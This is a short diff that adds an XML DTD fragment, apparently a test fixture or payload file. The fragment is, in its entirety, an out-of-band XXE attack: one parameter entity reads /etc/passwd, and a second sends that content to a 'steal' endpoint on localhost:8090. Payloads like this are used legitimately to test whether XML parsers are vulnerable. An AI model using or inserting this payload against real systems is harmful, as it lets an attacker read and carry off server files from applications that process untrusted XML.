@@ -1,0 +1,3 @@
+<!ENTITY % file SYSTEM "file:///etc/passwd">
+<!ENTITY % eval "<!ENTITY injected SYSTEM 'http://localhost:8090/steal?data=%file;'>">
+%eval;
